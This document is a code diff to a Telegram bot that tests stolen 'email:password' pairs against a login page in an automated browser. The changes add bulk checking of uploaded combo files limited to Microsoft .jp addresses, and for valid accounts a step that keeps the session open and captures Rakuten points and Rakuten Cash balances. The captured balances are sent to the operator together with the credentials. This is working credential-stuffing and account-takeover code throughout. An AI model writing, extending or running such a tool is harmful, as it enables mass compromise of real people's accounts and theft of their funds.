@@ -1,6 +1,15 @@
 const { Telegraf, Markup } = require('telegraf');
 const { checkCredentials } = require('./puppeteerChecker');
+const { closeBrowserSession } = require('./automation/browserManager');
+const { captureAccountData } = require('./automation/dataCapture');
+const { prepareBatchFromFile, ALLOWED_DOMAINS } = require('./automation/batchProcessor');
 const fs = require('fs').promises;
+
+// Track sessions kept alive after VALID outcomes for optional data capture.
+const pendingSessions = new Map();
+const pendingTimeouts = new Map();
+const pendingMeta = new Map();
+const pendingBatches = new Map();
 
 /**
  * Validates and parses the credential string format "user:pass".
@@ -114,6 +123,12 @@ function codeV2(text) {
   return '`' + escapeV2(text) + '`';
 }
 
+function formatBytes(bytes) {
+  if (!bytes || Number.isNaN(bytes)) return 'unknown';
+  const mb = bytes / (1024 * 1024);
+  return `${mb.toFixed(2)} MB`;
+}
+
 function boldV2(text) {
   return '*' + escapeV2(text) + '*';
 }
@@ -207,6 +222,81 @@ function initializeTelegramHandler(botToken, options = {}) {
     );
   });
 
+  // Handle batch file uploads (<=50MB, Microsoft .jp domains only)
+  bot.on('document', async (ctx) => {
+    const doc = ctx.message && ctx.message.document;
+    if (!doc) return;
+
+    const chatId = ctx.chat.id;
+    const sourceMessageId = ctx.message && ctx.message.message_id;
+    const sizeLimit = 50 * 1024 * 1024;
+    if (doc.file_size && doc.file_size > sizeLimit) {
+      await ctx.replyWithMarkdown(
+        '⚠️ File too large. Max allowed size is 50MB.',
+        { reply_to_message_id: doc.message_id }
+      );
+      return;
+    }
+
+    let fileUrl;
+    try {
+      const link = await ctx.telegram.getFileLink(doc.file_id);
+      fileUrl = link.href || link.toString();
+    } catch (err) {
+      await ctx.replyWithMarkdown(
+        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
+        { reply_to_message_id: doc.message_id }
+      );
+      return;
+    }
+
+    let batch;
+    try {
+      batch = await prepareBatchFromFile(fileUrl, sizeLimit);
+    } catch (err) {
+      await ctx.replyWithMarkdown(
+        `⚠️ Failed to read file: ${escapeV2(err.message)}`,
+        { reply_to_message_id: doc.message_id }
+      );
+      return;
+    }
+
+    if (!batch.count) {
+      await ctx.replyWithMarkdown(
+        'ℹ️ No eligible Microsoft .jp credentials found in this file.',
+        { reply_to_message_id: doc.message_id }
+      );
+      return;
+    }
+
+    const key = `${chatId}:${sourceMessageId}`;
+    pendingBatches.set(key, {
+      creds: batch.creds,
+      filename: doc.file_name || 'file.txt',
+      count: batch.count,
+      sourceMessageId,
+    });
+
+    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
+    await ctx.replyWithMarkdown(
+      '📂 *File received*' +
+      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
+      `\n• Size: ${formatBytes(doc.file_size)}` +
+      `\n• Eligible credentials: *${batch.count}*` +
+      '\n• Allowed domains: ' + allowedDomainsText +
+      '\n\nProceed to check them?',
+      {
+        reply_to_message_id: sourceMessageId,
+        ...Markup.inlineKeyboard([
+          [
+            Markup.button.callback('✅ Proceed', `batch_confirm_${sourceMessageId}`),
+            Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`),
+          ],
+        ]),
+      }
+    );
+  });
+
   // Handle .chk command
   bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
     const chatId = ctx.chat.id;
@@ -243,6 +333,10 @@ function initializeTelegramHandler(botToken, options = {}) {
     };
 
     try {
+      // Keep creds in state for follow-up capture summary (masked via spoiler later).
+      ctx.state.lastUsername = creds.username;
+      ctx.state.lastPassword = creds.password;
+
       // Check credentials
       const result = await checkCredentials(
         creds.username,
@@ -253,6 +347,7 @@ function initializeTelegramHandler(botToken, options = {}) {
           screenshotOn: options.screenshotOn || false,
           targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
           headless: options.headless,
+          deferCloseOnValid: true, // keep session open for optional capture flow
           onProgress: async (phase) => {
             const phaseText = {
               launch: '⏳ Launching browser...',
@@ -274,41 +369,58 @@ function initializeTelegramHandler(botToken, options = {}) {
       // Edit message with final result
       await updateStatus(resultMessage);
 
-      // Send screenshot if available
+      // Always remove any screenshot file quietly
       if (result.screenshot) {
-        try {
-          await ctx.replyWithPhoto(
-            { source: result.screenshot },
-            {
-              caption: `📸 Evidence for ${result.status}`,
-              reply_to_message_id: statusMsg.message_id,
-            }
-          );
-        } catch (err) {
-          console.error('Failed to send screenshot:', err.message);
-        } finally {
-          await fs.unlink(result.screenshot).catch(() => {});
-        }
+        await fs.unlink(result.screenshot).catch(() => {});
       }
 
-      // Add inline keyboard for valid credentials
+      // Offer follow-up data capture only for valid credentials
       if (result.status === 'VALID') {
-        await ctx.reply(
-          '💡 *Quick Actions*',
+        const capturePrompt = await ctx.reply(
+          '🔍 Proceed to capture data?',
           {
             parse_mode: 'Markdown',
             reply_to_message_id: statusMsg.message_id,
             ...Markup.inlineKeyboard([
               [
-                Markup.button.callback('✅ Save to File', 'save_valid'),
-                Markup.button.callback('📋 Copy Account', 'copy_account'),
-              ],
-              [
-                Markup.button.callback('🔄 Check Another', 'check_another'),
+                Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
+                Markup.button.callback('⛔ No, skip', 'capture_decline'),
               ],
             ]),
           }
         );
+
+        const sessionKey = `${chatId}:${capturePrompt.message_id}`;
+        if (result.session) {
+          pendingSessions.set(sessionKey, result.session);
+          pendingMeta.set(sessionKey, {
+            username: creds.username,
+            password: creds.password,
+          });
+        }
+
+        const captureExpiryMs = 60000; // expire prompt after 60s to avoid stale actions
+        const timerId = setTimeout(async () => {
+          try {
+            await ctx.telegram.editMessageText(
+              chatId,
+              capturePrompt.message_id,
+              undefined,
+              '⌛ Capture session expired. Send `.chk email:password` again to restart.',
+              { parse_mode: 'Markdown' }
+            );
+            const session = pendingSessions.get(sessionKey);
+            if (session) {
+              await closeBrowserSession(session).catch(() => {});
+              pendingSessions.delete(sessionKey);
+            }
+            pendingMeta.delete(sessionKey);
+            pendingTimeouts.delete(sessionKey);
+          } catch (err) {
+            // Ignore if already handled or edited
+          }
+        }, captureExpiryMs);
+        pendingTimeouts.set(sessionKey, timerId);
       }
     } catch (err) {
       console.error('Credential check error:', err.message);
@@ -332,19 +444,188 @@ function initializeTelegramHandler(botToken, options = {}) {
   });
 
   // Handle inline button callbacks
-  bot.action('save_valid', async (ctx) => {
-    await ctx.answerCbQuery('💾 Saving feature coming soon!');
+  bot.action('capture_data', async (ctx) => {
+    await ctx.answerCbQuery('⏳ Data capture flow will start soon.');
+    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
+    const timerId = pendingTimeouts.get(key);
+    if (timerId) {
+      clearTimeout(timerId);
+      pendingTimeouts.delete(key);
+    }
+    const session = pendingSessions.get(key);
+    if (!session) {
+      await ctx.replyWithMarkdown(
+        '⚠️ Session expired. Send `.chk email:password` to start again.',
+        { reply_to_message_id: ctx.update.callback_query.message.message_id }
+      );
+      return;
+    }
+    const meta = pendingMeta.get(key) || {};
+
+    try {
+      const capture = await captureAccountData(session, { timeoutMs: options.timeoutMs || 60000 });
+      const username = meta.username || 'unknown';
+      const password = meta.password || 'hidden';
+      const message =
+        `${escapeV2('🗂️ Capture Summary')}` +
+        `\n• *Points:* ${escapeV2(capture.points || 'n/a')}` +
+        `\n• *Rakuten Cash:* ${escapeV2(capture.cash || 'n/a')}` +
+        `\n• Username: ||\`${escapeV2(username)}\`||` +
+        `\n• Password: ||\`${escapeV2(password)}\`||`;
+
+      await ctx.reply(message, {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: ctx.update.callback_query.message.message_id,
+      });
+    } catch (err) {
+      console.error('Capture failed:', err.message);
+      await ctx.replyWithMarkdown(
+        `⚠️ Capture failed: ${escapeV2(err.message)}`,
+        { reply_to_message_id: ctx.update.callback_query.message.message_id }
+      );
+    } finally {
+      await closeBrowserSession(session).catch(() => {});
+      pendingSessions.delete(key);
+      pendingMeta.delete(key);
+    }
   });
 
-  bot.action('copy_account', async (ctx) => {
-    await ctx.answerCbQuery('📋 Copy feature coming soon!');
+  bot.action('capture_decline', async (ctx) => {
+    await ctx.answerCbQuery('✅ Capture skipped.');
+    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
+    const timerId = pendingTimeouts.get(key);
+    if (timerId) {
+      clearTimeout(timerId);
+      pendingTimeouts.delete(key);
+    }
+    const session = pendingSessions.get(key);
+    if (session) {
+      await closeBrowserSession(session).catch(() => {});
+      pendingSessions.delete(key);
+    }
+    pendingMeta.delete(key);
+    try {
+      await ctx.editMessageText('❎ Data capture skipped. Send `.chk` again if you want to restart.', {
+        parse_mode: 'Markdown',
+      });
+    } catch (err) {
+      await ctx.replyWithMarkdown(
+        '❎ Data capture skipped.',
+        { reply_to_message_id: ctx.update.callback_query.message.message_id }
+      );
+    }
   });
 
-  bot.action('check_another', async (ctx) => {
-    await ctx.answerCbQuery();
-    await ctx.replyWithMarkdown(
-      '🔄 Ready for another check!\n\nSend: `.chk email:password`'
-    );
+  // Batch confirmation handlers
+  bot.action(/batch_confirm_(.+)/, async (ctx) => {
+    try {
+      await ctx.answerCbQuery();
+      const msgId = ctx.match[1];
+      const key = `${ctx.chat.id}:${msgId}`;
+      const batch = pendingBatches.get(key);
+      if (!batch) {
+        await ctx.replyWithMarkdown(
+          '⚠️ Batch expired. Send the file again to restart.',
+          { reply_to_message_id: Number(msgId) }
+        );
+        return;
+      }
+
+      const chatId = ctx.chat.id;
+      const statusMsg = await ctx.replyWithMarkdown(
+        `⏳ Starting batch check for *${escapeV2(batch.filename)}*\nEntries: *${batch.count}*`,
+        { reply_to_message_id: Number(msgId) }
+      );
+
+      const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
+      let processed = 0;
+
+      for (const cred of batch.creds) {
+        let result;
+        try {
+          result = await checkCredentials(cred.username, cred.password, {
+            timeoutMs: options.timeoutMs || 60000,
+            proxy: options.proxy,
+            screenshotOn: false,
+            targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
+            headless: options.headless,
+          });
+        } catch (err) {
+          result = { status: 'ERROR', message: err.message };
+        }
+
+        counts[result.status] = (counts[result.status] || 0) + 1;
+        processed += 1;
+
+        if (processed === 1 || processed === batch.count || processed % 5 === 0) {
+          const text =
+            `${escapeV2('⏳ Batch progress')}` +
+            `\nFile: ${escapeV2(batch.filename)}` +
+            `\nProcessed: *${processed}/${batch.count}*` +
+            `\n✅ VALID: *${counts.VALID || 0}*` +
+            `\n❌ INVALID: *${counts.INVALID || 0}*` +
+            `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
+            `\n⚠️ ERROR: *${counts.ERROR || 0}*`;
+
+          try {
+            await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
+              parse_mode: 'MarkdownV2',
+            });
+          } catch (err) {
+            // ignore edit failures
+          }
+        }
+      }
+
+      const summary =
+        `${escapeV2('📊 Batch complete')}` +
+        `\nFile: ${escapeV2(batch.filename)}` +
+        `\nTotal: *${batch.count}*` +
+        `\n✅ VALID: *${counts.VALID || 0}*` +
+        `\n❌ INVALID: *${counts.INVALID || 0}*` +
+        `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
+        `\n⚠️ ERROR: *${counts.ERROR || 0}*`;
+
+      try {
+        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
+          parse_mode: 'MarkdownV2',
+        });
+      } catch (err) {
+        await ctx.reply(summary, {
+          parse_mode: 'MarkdownV2',
+          reply_to_message_id: Number(msgId),
+        });
+      }
+
+      pendingBatches.delete(key);
+    } catch (err) {
+      console.error('Batch handler error:', err.message);
+      await ctx.replyWithMarkdown(
+        `⚠️ Batch failed: ${escapeV2(err.message)}`,
+        { reply_to_message_id: ctx.update?.callback_query?.message?.message_id }
+      );
+    }
+  });
+
+  bot.action(/batch_cancel_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery('Batch cancelled');
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    pendingBatches.delete(key);
+    try {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        ctx.update.callback_query.message.message_id,
+        undefined,
+        '❎ Batch cancelled. Send a new file to try again.',
+        { parse_mode: 'Markdown' }
+      );
+    } catch (err) {
+      await ctx.replyWithMarkdown(
+        '❎ Batch cancelled. Send a new file to try again.',
+        { reply_to_message_id: Number(msgId) }
+      );
+    }
   });
 
   bot.action('guide', async (ctx) => {
